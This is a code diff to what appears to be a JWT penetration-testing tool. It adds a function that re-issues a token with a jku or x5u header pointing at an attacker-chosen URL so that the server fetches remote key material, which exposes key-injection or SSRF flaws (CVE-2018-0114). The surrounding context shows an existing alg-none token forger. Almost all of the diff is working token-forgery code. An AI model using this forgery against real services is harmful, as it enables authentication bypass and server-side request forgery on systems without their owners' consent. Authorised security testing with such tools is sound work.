@@ -88,6 +88,32 @@ def forge_alg_none(token: str) -> str:
     return f"{header_seg}.{payload_seg}."
 
 
+def forge_remote_key_header(token: str, url: str, *, param: str = "jku") -> str:
+    """Re-issue *token* with a ``jku``/``x5u`` header pointing at *url* (an OAST canary),
+    keeping the original payload. A server that fetches the remote key material during
+    verification calls back — proof of a key-injection / SSRF surface (CVE-2018-0114).
+    Signature validity is irrelevant: the fetch happens before verification."""
+
+    token = token.strip()
+    if token.lower().startswith("bearer "):
+        token = token[7:].strip()
+    parts = token.split(".")
+    if len(parts) < 2:
+        raise ValueError("not a JWT")
+    try:
+        header = json.loads(_b64url_decode(parts[0]))
+    except (ValueError, json.JSONDecodeError):
+        header = {}
+    if not isinstance(header, dict):
+        header = {}
+    header = {k: v for k, v in header.items() if k not in ("jku", "x5u")}
+    header[param] = url
+    header.setdefault("alg", "RS256")
+    header_seg = _b64url_nopad(json.dumps(header, separators=(",", ":")).encode())
+    sig = parts[2] if len(parts) >= 3 and parts[2] else "moonmcp"
+    return f"{header_seg}.{parts[1]}.{sig}"
+
+
 def analyze_jwt(token: str, now_epoch: int | None = None) -> JwtAnalysis:
     token = token.strip()
     if token.lower().startswith("bearer "):
